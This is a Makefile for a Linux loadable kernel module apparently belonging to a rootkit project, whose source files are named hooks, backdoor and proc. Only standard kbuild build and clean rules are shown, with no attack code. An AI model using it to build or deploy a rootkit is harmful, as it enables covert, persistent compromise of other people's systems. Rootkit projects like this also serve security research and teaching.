obj-m = rootkit.o
rootkit-objs := src/hooks.o src/backdoor.o src/proc.o src/rootkit.o
KDIR = /lib/modules/`uname -r`/build

all: kbuild

kbuild:
	make -C $(KDIR) M=`pwd`

clean:
	#rm -r *.mod.c *.o *.ko *.symvers *.order .*cmd .tmp_versions
	make -C $(KDIR) M=`pwd` clean
